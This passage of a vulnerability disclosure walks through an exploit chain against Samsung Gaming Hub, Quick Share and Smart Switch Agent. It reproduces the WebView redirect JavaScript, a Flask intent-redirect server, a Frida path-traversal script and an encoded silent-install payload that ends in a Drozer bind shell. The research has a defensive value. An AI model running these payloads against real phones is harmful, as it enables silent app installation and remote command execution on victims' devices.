following software. At the time of this document’s writing, the affected versions listed below are the latest publicly released versions: Samsung Gaming Hub Android application Package name: com.samsung.android.game.gamehome Version: 7.1.01.7 Samsung Quick Share Package name: com.samsung.android.app.sharelive Version: 13.6.53.6 Samsung Quick Share Agent Package name: com.samsung.android.aware.service Version: 3.5.19.33 Samsung EasyMover Agent Package name: com.sec.android.easyMover.Agent Version: 2.0.02.24 The exploit chain requires: Control of a domain name that starts with one of the following: us.mcsvc.samsung.com gmp.samsungapps.com smax.samsungapps.com A web server that resides on the above controlled domain must have the following file: index.html A rooted Samsung phone running the custom Frida script yayscriptyay.js within Bluetooth range of the target phone The rooted Samsung phone must also contain the following file and location: /storage/emulated/0/&lt;any folder name&gt;/yay.apk yay.apk can be any .apk file of your choosing For this exploit chain, yay.apk is a custom build of Drozer An attacker controlled web server (can be any IP address or domain) which has the following files: yay.py index.html (different index.html) For this exploit chain, Ken Gannon / 伊藤　剣 controls the domain us.mcsvc.samsung.com.maliciouserection.com. The contents of index.html at this webserver is below: yaytrampolineyay &lt;script&gt; // get hostname and port var yayquerystringyay = window.location.search; var yayurlparamsyay = new URLSearchParams(yayquerystringyay); var yayattackeryay = yayurlparamsyay.get('yayattackeryay'); // open sharelive to start awareservice location.href="http://" + yayattackeryay + "/yaylaunchshareliveyay"; // redirect after 2 seconds const yayshorttimeoutyay = setTimeout(yaystartyay, 2000); // open sharelive and retrieve file function yaystartyay() { location.href="http://" + yayattackeryay + "/yayshareliveyay"; } // redirect after 15 seconds const yaytimeoutyay = setTimeout(yayfinalyay, 15000); // redirect to launch easymover agent function yayfinalyay() { location.href="http://" + yayattackeryay + "/yayfinalyay"; // redirect after another 15 seconds const yaytimeout2yay = setTimeout(yaylaunchyay, 15000); } // launch drozer function yaylaunchyay() { location.href="http://" + yayattackeryay + "/yaylaunchyay"; } &lt;/script&gt; The contents of the Frida script yayscriptyay.js is below: console.log("script loaded"); Java.perform(function() { var yayclass1yay = Java.use('e2.t'); yayclass1yay.n.overload('org.json.JSONObject', 'e2.h', 'boolean').implementation = function(a,b,c) { if (a.has("IsPrivateShare")) { a.put("IsPrivateShare", true) } if (a.has("Path")) { a.put("Path","/../../../../../../GPUWatch_Dump/html/") } var ret_val = this.n(a,b,c); console.log("send json: " + a + "\n" + "send bytes: " + ret_val + "\n") return ret_val; } }); The attacker controlled web server, which can be on any IP address or host name, must launch the web server by running the Python script yay.py. The contents of yay.py is below: from flask import Flask, redirect, url_for, send_from_directory app = Flask(__name__) # Route for serving index.html @app.route('/') def index(): return send_from_directory('', 'index.html') # redirect to open com.sec.android.easyMover.Agent @app.route('/yayfinalyay') def yayfinalyay(): return redirect("intent://#Intent;component=com.sec.android.easyMover.Agent/.ui.SsmUpdateCheckActivity;action=com.sec.android.easyMover.Agent.WATCH_INSTALL_SMART_SWITCH;S.MODE=DIALOG;S.ssm_action=yayactionyay;S.ssm_uri=%63%6f%6e%74%65%6e%74%3a%2f%2f%63%6f%6d%2e%73%61%6d%73%75%6e%67%2e%67%70%75%77%61%74%63%68%61%70%70%2e%48%74%6d%6c%44%75%6d%70%50%72%6f%76%69%64%65%72%2f%79%61%79%2e%61%70%6b;end;", code=302) # launch sharelive to stare aware service @app.route('/yaylaunchshareliveyay') def yaylaunchshareliveyay(): return redirect("intent://#Intent;component=com.samsung.android.app.sharelive/.presentation.main.MainActivity;end;", code=302) # sharelive to download yay.apk to arbitrary location @app.route('/yayshareliveyay') def yayshareliveyay(): yayqrcodeyay = "88AKqZwy2Hmr" return redirect("intent://qr.quickshare.samsungcloud.com/" + yayqrcodeyay + "#Intent;component=com.samsung.android.app.sharelive/com.samsung.android.app.sharelive.presentation.applink.QrCodeAppLinkActivity;scheme=https;end;", code=302) # launch drozer @app.route('/yaylaunchyay') def yaylaunchyay(): return redirect("intent://#Intent;component=com.yaydevhackmodyay.drozer/com.mwr.dz.activities.MainActivity;end;", code=302) # pichu dancing @app.route('/pichu-dance.gif') def pichuDance(): return send_from_directory('', 'pichu-dance.gif') if __name__ == '__main__': context = ('cert.pem', 'key.pem') app.run(debug=True, port=8000, host="0.0.0.0") Finally, the contents of index.html that is on the same webserver being hosted by yay.py is below: &lt;h1&gt; &lt;button style="height:200px;width:200px" onclick="yayfunctionyay()"&gt;yaypocyay&lt;/button&gt; &lt;script type="text/javascript"&gt; function yayfunctionyay() { var yayhostyay = location.hostname; // gets host / domain, can also set this to a static value var yayportyay = location.port // must be a port number of some sort, or let the script get the port number // redirect to game home location.href="intent://com.samsung.android.game.gamehome/gmp?url=https://us.mcsvc.samsung.com.&lt;redacted&gt;.com?yayattackeryay=" + yayhostyay + ":" + yayportyay + "#Intent;scheme=gamelauncher;end"; &lt;/script&gt; &lt;br&gt; &lt;img src="pichu-dance.gif"&gt; &lt;/h1&gt; After a successful exploitation, Drozer will be installed and launched on the device. The custom build of Drozer starts a bind shell when the application is opened. Because of this, it is possible for an attacker to connect to the Drozer bind shell and execute arbitrary commands: root@1f2e8d5823c5:/# drozer console connect --server host.docker.internal Selecting 5dee1795a19a8793 (samsung SM-S921B 14) .. ..:. ..o.. .r.. ..a.. . ....... . ..nd ro..idsnemesisand..pr .otectorandroidsneme. .,sisandprotectorandroids+. ..nemesisandprotectorandroidsn:. .emesisandprotectorandroidsnemes.. ..isandp,..,rotecyayandro,..,idsnem. .isisandp..rotectorandroid..snemisis. ,andprotectorandroidsnemisisandprotec. .torandroidsnemesisandprotectorandroid. .snemisisandprotectorandroidsnemesisan: .dprotectorandroidsnemesisandprotector. drozer Console (v3.1.0) dz&gt; shell Attempting to run shell module :/data/data/com.yaydevhackmodyay.drozer $ id uid=10356(u0_a356) gid=10356(u0_a356) groups=10356(u0_a356),3003(inet),9997(everybody),20356(u0_a356_cache),50356(all_a356) context=u:r:untrusted_app_32:s0:c100,c257,c512,c768 Technical Details Bugs 1 and 2 – Use a Browsable Intent to launch Gaming Hub and open a WebView to a custom URL with JavaScript enabled Exploit Payload Below is the payload used in this chain link. An attacker should host this HTML code and trick a user into tapping the hyperlink on their phone: &lt;html&gt; &lt;body&gt; &lt;h1&gt; &lt;a href=" intent://com.samsung.android.game.gamehome/gmp?url=https://us.mcsvc.samsung.com.&lt;redacted&gt;.com?yayattackeryay=&lt;attackerServer&gt;#Intent;scheme=gamelauncher;end"&gt;yaypocyay&lt;/a&gt; &lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; Exploit Details The application “Gaming Hub” (com.samsung.android.game.gamehome version 7.1.01.7) contains an exported Activity (com.samsung.android.game.gamehome.app.MainActivity) which can be launched via Browsable Intent. Depending on the Data URI attached to the Intent, different actions can be executed when the Intent is processed. MainActivity retrieves the incoming Browsable Intent via the following code, which then passes the Intent onto the class com.samsung.android.game.gamehome.gmp.ui.GmpDeepLinkUtil method c(Context, Intent). public final class MainActivity extends a { ... public void onCreate(Bundle bundle) { super.onCreate(bundle); ... if (bundle == null) { Intent intent = getIntent(); m0(intent); } ... public final void m0(Intent intent) { Intent deepLinkIntent = GmpDeepLinkUtil.a.c(this, intent); if (deepLinkIntent != null) { startActivity(deepLinkIntent); finish(); ... } The class GmpDeepLinkUtil will extract the Data URI from the Intent and create a new Intent object based on the first path segment of the URI. If the first path segment is set to “gmp”, then the following actions are taken: Create a new Intent object and set the component value of that Intent object to com.samsung.android.game.gamehome.gmp.ui.web.GmpWebActivity In the URI object, retrieve the GET parameter “url” and add it as an Intent String Extra called “url” to the newly created Intent object Adds the value “WebView” as an Intent String extra called “target” to the newly created Intent object Return the newly created Intent object public final class GmpDeepLinkUtil { ... public final Intent c(Context context, Intent intent) { Uri yayuriyay = intent.getData(); if (yayuriyay == null) { return null; } return d(context, yayuriyay); } public final Intent d(Context context, Uri yayuriyay) { try { ... String yayfirstpathyay = i(yayuriyay); // retrieves first path value ... Intent yayintentyay = a(); // create new Intent object if (yayfirstpathyay != null) { switch (yayfirstpathyay.hashCode()) { ... case 102474: // first path equals `gmp` if (!yayfirstpathyay.equals("gmp")) { break; } else { String yayqueryyay = yayuriyay.getQueryParameter("url"); if (yayqueryyay == null) { return null; } yayintentyay.putExtra("url", yayqueryyay); yayintentyay.putExtra("target", Path.WebView.name()); yayintentyay.setClass(context, GmpWebActivity.class); return yayintentyay; } ... } } Once the new Intent object is returned, it is passed back to class MainActivity method k0(Intent). From there, startActivity(Intent) is executed against the Intent object, which will launch the component com.samsung.android.game.gamehome.gmp.ui.web.GmpWebActivity. public final class MainActivity extends a { ... public void onCreate(Bundle bundle) { super.onCreate(bundle); ... if (bundle == null) { Intent intent = getIntent(); k0(intent); } ... public final void k0(Intent intent) { Intent deepLinkIntent = GmpDeepLinkUtil.a.c(this, intent); if (deepLinkIntent != null) { startActivity(deepLinkIntent); finish(); ... } In the class com.samsung.android.game.gamehome.gmp.ui.web.GmpWebActivity method onCreate(Bundle), the incoming Intent object is retrieved and the Intent String extra “target” is analyzed. Since the value is set to “WebView”, the application will perform two actions. First, the Intent object is passed to class com.samsung.android.game.gamehome.gmp.ui.GmpDeepLinkUtil method j(Intent) to retrieve and return the Intent String extra “url”. public final class GmpWebActivity extends s implements n, p { ... public void onCreate(Bundle bundle) { GmpDeepLinkUtil.Path path; super.onCreate(bundle); ... if (bundle == null) { ... Intent intent = getIntent(); path = gmpDeepLinkUtil.h(intent); // retrieves the String extra "target" } else { path = null; } int i = path == null ? -1 : b.a[path.ordinal()]; // checks value of "target" if (i == 1) { ... } else if (i == 3) { GmpDeepLinkUtil gmpDeepLinkUtil = GmpDeepLinkUtil.a; // new instance Intent yayintentyay = getIntent(); E0(this, gmpDeepLinkUtil.j(yayintentyay), null, false, true, 2, null); ... public final class GmpDeepLinkUtil { ... public final String j(Intent intent) { String stringExtra = intent.getStringExtra("url"); return stringExtra == null ? "" : stringExtra; } Next, the returned “url” String extra is passed to class GmpWebActivity method E0(GmpWebActivity, String, String, Boolean, Boolean, int, Object), which passes the “url” to method D0(String, String, boolean, boolean), which then passes the URL to method v0(String). public final class GmpWebActivity extends s implements n, p { ... public void onCreate(Bundle bundle) { GmpDeepLinkUtil.Path path; super.onCreate(bundle); ... if (bundle == null) { ... Intent intent = getIntent(); path = gmpDeepLinkUtil.h(intent); // retrieves the String extra "target" } else { path = null; } int i = path == null ? -1 : b.a[path.ordinal()]; // checks value of "target" if (i == 1) { ... } else if (i == 3) { GmpDeepLinkUtil gmpDeepLinkUtil = GmpDeepLinkUtil.a; // new instance Intent yayintentyay = getIntent(); E0(this, gmpDeepLinkUtil.j(yayintentyay), null, false, true, 2, null); ... public static void E0(GmpWebActivity gmpWebActivity, String yayurlyay, String str2, boolean z, boolean z2, int i, Object obj) { ... gmpWebActivity.D0(yayurlyay, str2, z, z2); } ... public final void D0(String yayurlyay, String str2, boolean z, boolean z2) { ... final String yayparsedurlyay = q0(yayurlyay); // do stuff if url scheme is either `gamelauncher` or `gmp` v0(yayparsedurlyay); In the method v0(String), a WebView is set to object d and configured. One thing to note is that the “url” value is passed to class com.samsung.android.game.gamehome.gmp.ui.web.GmpWebViewModel method F(String) to check if the “url” value is a valid URL. public final class GmpWebActivity extends s implements n, p { ... public final void v0(String yayurlyay) { WebView webView = r0().d; WebSettings settings = webView.getSettings(); settings.setDomStorageEnabled(true); ... if (s0().F(yayurlyay)) { p0(webView); } } The method F(String) passes the “url” value to multiple different areas of the application. One of these checks determines if the “url” value starts with one of the following: https://us.mcsvc.samsung.com https://d2da9i65hvaere.cloudfront.net/ https://gmp.samsungapps.com https://img.samsungapps.com/ https://d1559sbyyf3apa.cloudfront.net/ https://smax.samsungapps.com https://d2da9i65hvaere.cloudfront.net/ BUG 1 – Insufficient check against the URL Some of the URLs above did not end with the “/” character. Because of this, the host value of the incoming “url” simply needs to start with one of the vulnerable values. For example, in this exploit chain, our “url” value is set to https://us.mcsvc.samsung.com.maliciouserection.com?yayattackeryay=&lt;attackerServer&gt;. Since the URL does start with https://us.mcsvc.samsung.com, this check will pass successfully. After the check in the F(String) method is checked and it passes, the “url” value is passed to method p0(WebView). This method will take the WebView object d and enable JavaScript. public final class GmpWebActivity extends s implements n, p { ... public final void v0(String yayurlyay) { WebView webView = r0().d; WebSettings settings = webView.getSettings(); settings.setDomStorageEnabled(true); ... if (s0().F(yayurlyay)) { p0(webView); } } ... public final void p0(WebView webView) { webView.getSettings().setJavaScriptEnabled(true); webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true); ... Going back to method D0(String, String, boolean, boolean), the “url” value is passed to the method w0(String). public final class GmpWebActivity extends s implements n, p { ... public final void D0(String yayurlyay, String str2, boolean z, boolean z2) { ... final String yayparsedurlyay = q0(yayurlyay); // do stuff if url scheme is either `gamelauncher` or `gmp` v0(yayparsedurlyay); if (z2) { s0().G(false, new a() { ... public final void a() { GmpWebActivity.this.w0(yayparsedurlyay); } In method w0(String), the WebView object d is forced to load the URL value that was stored in our “url” value. public final class GmpWebActivity extends s implements n, p { ... public final void w0(String yayurlyay) { ... r0().d.loadUrl(yayurlyay); } BUG 2 – WebView Loads Any URL The WebView does not check the incoming URL before loading the URL. So the “url” value used in our exploit chain (https://us.mcsvc.samsung.com.maliciouserection.com?yayattackeryay=&lt;attackerServer&gt;) will be loaded into the WebView. Screenshot of Gaming Hub loading the URL https://us.mcsvc.samsung.com.maliciouserection.com?yayattackeryay=&lt;attackerServer&gt;: Bug 3 – Force Gaming Hub to start arbitrary exported Activities Exploit Payload Two payloads are used for this bug. The first payload is the HTML content that is hosted at the URL https://us.mcsvc.samsung.com.maliciouserection.com?yayattackeryay=&lt;attackerServer&gt;. Due to bugs 1 and 2, the Gaming Hub WebView will load and execute the below HTML code. yaytrampolineyay &lt;script&gt; // get hostname and port var yayquerystringyay = window.location.search; var yayurlparamsyay = new URLSearchParams(yayquerystringyay); var yayattackeryay = yayurlparamsyay.get('yayattackeryay'); // open sharelive to start awareservice location.href="http://" + yayattackeryay + "/yaylaunchshareliveyay"; // redirect after 2 seconds const yayshorttimeoutyay = setTimeout(yaystartyay, 2000); // open sharelive and retrieve file function yaystartyay() { location.href="http://" + yayattackeryay + "/yayshareliveyay"; } // redirect after 15 seconds const yaytimeoutyay = setTimeout(yayfinalyay, 15000); // redirect to launch easymover agent function yayfinalyay() { location.href="http://" + yayattackeryay + "/yayfinalyay"; // redirect after another 15 seconds const yaytimeout2yay = setTimeout(yaylaunchyay, 15000); } // launch drozer function yaylaunchyay() { location.href="http://" + yayattackeryay + "/yaylaunchyay"; } &lt;/script&gt; The second payload is a Python script that is hosted at an attacker controlled server. There is no IP address or domain requirements for this web server, as long as the server can be reached via HTTP/S. By running the below Python script, the attacker will run a Flask based web server: from flask import Flask, redirect, url_for, send_from_directory app = Flask(__name__) # Route for serving index.html @app.route('/') def index(): return send_from_directory('', 'index.html') # redirect to open com.sec.android.easyMover.Agent @app.route('/yayfinalyay') def yayfinalyay(): return redirect("intent://#Intent;component=com.sec.android.easyMover.Agent/.ui.SsmUpdateCheckActivity;action=com.sec.android.easyMover.Agent.WATCH_INSTALL_SMART_SWITCH;S.MODE=DIALOG;S.ssm_action=yayactionyay;S.ssm_uri=%63%6f%6e%74%65%6e%74%3a%2f%2f%63%6f%6d%2e%73%61%6d%73%75%6e%67%2e%67%70%75%77%61%74%63%68%61%70%70%2e%48%74%6d%6c%44%75%6d%70%50%72%6f%76%69%64%65%72%2f%79%61%79%2e%61%70%6b;end;", code=302) # launch sharelive to stare aware service @app.route('/yaylaunchshareliveyay') def yaylaunchshareliveyay(): return redirect("intent://#Intent;component=com.samsung.android.app.sharelive/.presentation.main.MainActivity;end;", code=302) # sharelive to download yay.apk to arbitrary location @app.route('/yayshareliveyay') def yayshareliveyay(): yayqrcodeyay = "88AKqZwy2Hmr" return redirect("intent://qr.quickshare.samsungcloud.com/" + yayqrcodeyay + "#Intent;component=com.samsung.android.app.sharelive/com.samsung.android.app.sharelive.presentation.applink.QrCodeAppLinkActivity;scheme=https;end;", code=302) # launch drozer @app.route('/yaylaunchyay') def yaylaunchyay(): return redirect("intent://#Intent;component=com.yaydevhackmodyay.drozer/com.mwr.dz.activities.MainActivity;end;", code=302) # pichu dancing @app.route('/pichu-dance.gif') def pichuDance(): return send_from_directory('', 'pichu-dance.gif') if __name__ == '__main__': context = ('cert.pem', 'key.pem') app.run(debug=True, port=8000, host="0.0.0.0") Exploit Details Continuing to exploit the Gaming Hub application, the loaded WebView contains code that will execute different actions based on the type of data that is received from the loaded web server. When the WebView receives a 302 Redirect code from the web server, the class com.samsung.android.game.gamehome.gmp.ui.web.o method shouldOverrideUrlLoading(WebView, WebResourceRequest) is executed. From there, the redirection URL is analyzed. If the redirection URL has a scheme value of intent://, then the URL is passed to class com.samsung.android.game.gamehome.gmp.ui.web.GmpWebActivity method f(Uri, int). public final class o extends WebViewClient { public final p a; // interface linked with GmpWebActivity ... public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) { boolean q; ... String yayschemeyay = request.getUrl().getScheme(); Uri yayurlyay = request.getUrl(); ... q = o.q("intent", yayschemeyay, true); // checks if first 2 objects match if (q) { this.a.f(url, a(yayurlyay)); // checks if the url authority value is either `instantplays` or `cloudgame` return true; } Class GmpWebActivity method f(Uri, int) takes the incoming URL and passes it to Android’s internal Intent parser. The Intent parser is commonly used to craft Intent objects based on the incoming URI value. After the Intent object is created, startActivity(Intent) is executed against the Intent object. public final class GmpWebActivity extends s implements n, p { ... public void f(Uri yayurlyay, int i) { Intent yayintentyay = Intent.parseUri(yayurlyay.toString(), 0); yayintentyay.addFlags(i); ... a.b(a, this, yayintentyay, false, 2, null); } ... public final class a { ... public static boolean b(a a, Context context, Intent yayintentyay, boolean z, int i, Object obj) { ... return a.a(context, yayintentyay, z); } ... public final boolean a(Context context, Intent yayintentyay, boolean z) { ... try { context.startActivity(yayintentyay); return true; ... } BUG 3 – Start Arbitrary Exported Activities If the web server sends a 302 Redirect HTTP code with a redirect URL starting with intent://, the WebView in Gaming Hub can be forced to start arbitrary activities. In our exploit chain, the URL https://us.mcsvc.samsung.com.maliciouserection.com?yayattackeryay=&lt;attackerServer&gt; contains HTML code which runs JavaScript. This JavaScript forces the WebView to make a GET request to the attacker controlled server, defined by the GET parameter “". An attacker should run the previously mentioned Python script, which will host the web server at “". This Python script simply returns a `302 Redirect HTTP` code, along with different URIs with `intent://` schemes. For example, if a GET request is made to “http:///yaylaunchshareliveyay", the Python script will return a 302 Redirect HTTP code with the following URI: intent://#Intent;component=com.samsung.android.app.sharelive/.presentation.main.MainActivity;end; When the Gaming Hub WebView receives this URI, it will: Pass the URI to Android’s internal Intent parser Craft an Intent object based on the URI Run startActivity(Intent) against the Intent Object The rest of this exploit chain heavily relies on the ability to launch arbitrary exported Activities due to sending different 302 Redirect URIs. It’s not a bug, it’s a feature – Force the phone to download arbitrary files from a nearby phone Exploit Payload Two payloads are used for this feature, both of which are sent from the web server. First, Gaming Hub will be forced to launch the Samsung Quick Share application: Intent;component=com.samsung.android.app.sharelive/.presentation.main.MainActivity The second payload will force Gaming Hub to launch Samsung Quick Share and download an arbitrary file from a nearby attacker controlled device. Note that the nearby attacker controlled device should be sharing a file or folder via Samsung Quick Share’s QR Share feature. The value should be replaced via the value shown on the nearby attacker controlled device: intent://qr.quickshare.samsungcloud.com/&lt;shareCode&gt;#Intent;component=com.samsung.android.app.sharelive/com.samsung.android.app.sharelive.presentation.applink.QrCodeAppLinkActivity;scheme=https;end; Not an Exploit Details The application “Quick Share” (com.samsung.android.app.sharelive version 13.6.53.6) contains an exported Activity (com.samsung.android.app.sharelive.presentation.applink.QrCodeAppLinkActivity). QrCodeAppLinkActivity retrieves the incoming intent and checks the Data URI attached to the Intent object. The Data URI must start with one of the following values: https://qr.quickshare.samsungcloud.com/ https://qr.stg-quickshare.samsungcloud.com/ If the Data URI does not start with one of the above values, then the Activity finishes. public final class QrCodeAppLinkActivity extends l { ... public final void onCreate(Bundle bundle) { ... String yaydatayay = getIntent().getDataString(); List list = a.a; // list of valid URL values int i10 = 1; int i11 = 0; if (!(list instanceof Collection) || !list.isEmpty()) { Iterator it = list.iterator(); while (it.hasNext()) { if (k.r0(yaydatayay, (String) it.next(), false)) { // checks if yaydatayay starts with one of the URL values z10 = true; break; } } } if (!z10) { ... finish(); return; } One thing to note about the URLs is that they are closely related to how Quick Share is used to share files between devices via QR Code. When sharing a file via QR code, the sending device displays: A QR code A URL that can be browsed to In the above screenshot, the QR code contains the URL https://qr.quickshare.smasungcloud.com/kvqpsbyNG5WW which matches the URL requirements mentioned earlier. Additionally, the URL ends in a code that is also present in the URL that can be browsed to. Using this information, it can be deduced that the URL that should be passed to QrCodeAppLinkActivity should be a QR code URL. If the QR code is read by a Samsung phone, then the Samsung phone will automatically launch Quick Share and attempt connect to whatever device is hosting the file. From there, the Samsung phone will download the file automatically from the hosting device. Then the file will be saved to /storage/emulated/0/Download/Quick Share/. Its not a bug, it’s a feature – Automatically download files without user confirmation If the Activity QrCodeAppLinkActivity is launched with an appropriate QR code URL, the Quick Share application will automatically attempt to connect to the hosting device and download the designated file. This is done without user confirmation. It is understood that the Activity QrCodeAppLinkActivity must be exported in order to function properly. This is due to how phones read QR codes and craft Intent objects based on the content of the QR code. Going back to the exploit chain, we will be using two payloads. First, the following payload forces Gaming Hub to simply launch Quick Share. This is to ensure that the appropriate services are running in the background before proceeding with the next step. Intent;component=com.samsung.android.app.sharelive/.presentation.main.MainActivity After Quick Share is launched, the MainActivity of Quick Share is kept in the foreground while the Gaming Hub WebView is kept in the background. The WebView still processes JavaScript and data while running in the background. After a few seconds, the Gaming Hub WebView receives another payload, which forces the device to perform the following actions: Quick Share’s QRCodeAppLinkActivity Activity is launched A QR code URL is passed to the Activity The QR code value is read from the URL The phone will recognize that it must attempt to download a file from a nearby phone The phone will attempt to connect to the nearby phone and download the file automatically The file is placed in /storage/emulated/0/Download/Quick Share/ ===================================================================================== NOTE: typically on Android, an Activity must be in the foreground before it can launch Activities. However, if an application has the correct Android permissions, it will have the ability to launch Activities even if the running application is in the background. In this case, Gaming Hub does contain those permissions. So while Gaming Hub is in the background and Quick Share’s Main Activity is in the foreground, Gaming Hub is still able to launch Activities. Specifically, when Gaming Hub is launched, it starts a service in the foreground of the device, and its able to keep that permission via the android.permission.FOREGROUND_SERVICE Android permission. &lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="710107000" android:versionName="7.1.01.7" android:compileSdkVersion="35" android:compileSdkVersionCodename="15" package="com.samsung.android.game.gamehome" ... &lt;uses-permission android:name="android.permission.FOREGROUND_SERVICE"/&gt; So as long as the service continues to run in the foreground, then Gaming Hub can continue to launch Activities even if none of its own Activities are in the foreground. Bug 4 – A file downloaded via Quick Share can be saved to an arbitrary location Exploit Payload A Frida script (or Xposed Module) can be used to exploit this issue. Run the following Frida Script on an attacker controlled phone: console.log("script loaded"); Java.perform(function() { var yayclass1yay = Java.use('e2.t'); yayclass1yay.n.overload('org.json.JSONObject', 'e2.h', 'boolean').implementation = function(a,b,c) { if (a.has("IsPrivateShare")) { a.put("IsPrivateShare", true) } if (a.has("Path")) { a.put("Path","/../../../../../../GPUWatch_Dump/html/") } var ret_val = this.n(a,b,c); console.log("send json: " + a + "\n" + "send bytes: " + ret_val + "\n") return ret_val; } }); The attacker controlled phone should then share a file on their phone via Quick Share. Take note of the QR code URL that is generated on the attacker controlled phone generate. That QR code URL should then be used to launch Quick Share on the target phone. NOTE: the GPUWatch_Dump/html/ value in the above script is strictly used for this exploit chain. Exploit Details The application “Quick Share Agent” (com.samsung.android.aware.service version 3.5.19.33) is a background application that runs alongside the Quick Share application. When sending and receiving files via Quick Share, it is actually Quick Share Agent that handles connections to remote phones and sending/receiving files. In Quick Share Agent, the class e2.t handles: Managing a Socket connection between phones Sending data to the remote device Receiving data from the remote device When sending a file, two JSON messages are sent before sending the file(s). The first message establishes information about the connection, and two fields are of interest for this exploit chain: What type of data is being sent (File/Folder) If the transfer is considered a “PrivateShare”, which is a Samsung exclusive function to encrypt the file being sent { "TotalBytes": 3322214, "TotalCount": 1, "ItemType": "File", "IsAlbumShare": true, "IsPrivateShare": false, "SenderFriendlyName": "YayAttackerPhoneYay", "TransportDescription": "", ... The second message contains information about the file/folder being sent. Two fields are of interest for this exploit chain: Name Path { "Name": "Yay.jpg", "TotalBytes": 3322214, "Path":"\/storage\/emulated\/0\/ShareViaWifi\/Yay.jpg", "Url": "ftcp_url_0_", ... When the second message is received, Quick Share Agent passes the received JSON string to class f2.i method s(JSONObject). From there, Name and Path are passed to two different sanitization functions, depending on if class x1.b method x() returns True or False. public final class i implements k.c, c.c { public final b b; ... public final f2.l s(JSONObject yayreceivedjsonyay) { ... String yaynameyay; String yaypathyay; if(this.b.x()) { // no sanitization yaynameyay = yayreceivedjsonyay.optString("Name", "Unknown.dat"); yaypathyay = yayreceivedjsonyay.optString("Path"); } else { // sanitize Name and Path String yaytemp1yay = yayreceivedjsonyay.optString("Name", "Unknown.dat"); yaynameyay = new k5.i("[:\"&lt;&gt;*?|/\u0000-\u001F\u007F\\\\]").e (yaytemp1yay, "-"); // sanitizes name String yaytemp2yay = yayreceivedjsonyay.optString("Path"); yaypathyay = new k5.i("[:\"&lt;&gt;*?|\u0000-\u001F\u007F\\\\]").e(yaytemp2yay, "-"); } Looking at class x1.b method x(), the return value was dependent on the value of the static Boolean value h. And the value of h is dependent on whatever executes the method J(boolean). public class b { public boolean h; ... public final void J(boolean z5) { this.h = z5; } ... public final boolean x() { return this.h; } Previously, it was mentioned that 2 JSON messages are sent to the receiving phone. The first message is processed in class f2.i method D(c, JSONObject). In one part of that method, the value related to the key IsPrivateShare is extracted and then is passed as an argument to class x1.b method J(boolean). public final class i implements k.c, c.c { ... public final boolean D(c c, JSONObject yayjsonobjectyay) { ... this.g.J(yayjsonobjectyay.optBoolean("IsPrivateShare", false)); BUG 4 – IsPrivateShare is attacker controlled, resulting in a Path Traversal attack When receiving a file/folder from an attacker controlled phone, and the attacker controlled phone sends a IsPrivateShare value of True, then the attacker controlled phone can force the target phone to save the incoming file into any directory that Quick Share Agent has write access to. In our exploit chain, we use this vulnerability to save a Drozer .apk file onto the victim’s phone at the location /storage/emulated/0/GPUWatch_Dump/html/. In order to do this, first run the following Frida command. Note that you might have to share a file normally first in order to start the Quick Share Agent service: $ frida -U -l yayscriptyay.js com.samsung.android.aware.service Below is the contents of yayscriptyay.js. This script will: Intercept all JSON messages that are intended to be sent to the receiving phone Change the IsPrivateShare value to True Change the Path value to /../../../../../../GPUWatch_Dump/html/ console.log("script loaded"); Java.perform(function() { var yayclass1yay = Java.use('e2.t'); yayclass1yay.n.overload('org.json.JSONObject', 'e2.h', 'boolean').implementation = function(a,b,c) { if (a.has("IsPrivateShare")) { a.put("IsPrivateShare", true) } if (a.has("Path")) { a.put("Path","/../../../../../../GPUWatch_Dump/html/") } var ret_val = this.n(a,b,c); console.log("send json: " + a + "\n" + "send bytes: " + ret_val + "\n") return ret_val; } }); NOTE: the number of “../” in the new Path value matters. When Quick Share “downloads a folder” from a phone, it actually performs the following steps: Creates a new directory /storage/emulated/0/Android/data/com.samsung.android.aware.service/files/&lt;session_id&gt;/ The folder(s) defined in the Path value are created in the above mentioned directory The file(s) that are in the sender’s phone are sent to the receiving phone, and saved in the above newly created directory Once all files are sent, the above newly created directory is copied to /storage/emulated/0/Download/Quick Share/ The number of “../” ensures that during the folder creation process (step 2), the folder(s) are created in the /storage/emulated/0/ directory. Once the Frida script is running, place the .apk file into any directory on the attacker controlled phone. Then share the folder and select “Quick Share”. Finally, generate a QR code for the share by tapping “QR code or link”. Now when someone tries to download the folder, yay.apk will be placed in /storage/emulated/0/GPUWatch_Dump/html/. e1s:/storage/emulated/0 # ls ./GPUWatch_Dump/html/ yay.apk For our exploit chain, when the attacker phone generates a QR code, the random code at the end of the URL should be used in bug 4. This will force the target phone to download the .apk file automatically without user confirmation. Bug 5 – Silently install .apk file located on disk Exploit Code The following payload is sent from to force Gaming Hub to launch Smart Switch Agent: intent://#Intent;component=com.sec.android.easyMover.Agent/.ui.SsmUpdateCheckActivity;action=com.sec.android.easyMover.Agent.WATCH_INSTALL_SMART_SWITCH;S.MODE=DIALOG;S.ssm_action=yayactionyay;S.ssm_uri=%63%6f%6e%74%65%6e%74%3a%2f%2f%63%6f%6d%2e%73%61%6d%73%75%6e%67%2e%67%70%75%77%61%74%63%68%61%70%70%2e%48%74%6d%6c%44%75%6d%70%50%72%6f%76%69%64%65%72%2f%79%61%79%2e%61%70%6b;end; NOTE: the ssm_uri value is set to a custom value that is specific to this exploit chain. Exploit Details The application “Smart Switch Agent” (com.sec.android.easyMover.Agent version 2.0.02.24) is a background application that runs alongside the Smart Switch application. When transferring data between an old phone and a new Samsung phone, the Smart Switch Agent helps facilitate the installation of applications on the new phone. One of the exported Activities, com.sec.android.easyMover.Agent.ui.SsmUpdateCheckActivity, is protected by a custom permission, com.wssnps.permission.COM_WSSNPS. However, Gaming Hub also uses this permission, making it possible for Gaming Hub to launch the SsmUpdateCheckActivity Activity. &lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="710107000" android:versionName="7.1.01.7" ... package="com.samsung.android.game.gamehome" ... &lt;uses-permission android:name="com.wssnps.permission.COM_WSSNPS"/&gt; &lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="200200024" android:versionName="2.0.02.24" ... package="com.sec.android.easyMover.Agent" ... &lt;activity android:name="com.sec.android.easyMover.Agent.ui.SsmUpdateCheckActivity" android:permission="com.wssnps.permission.COM_WSSNPS" android:exported="true" android:excludeFromRecents="true" android:screenOrientation="portrait" 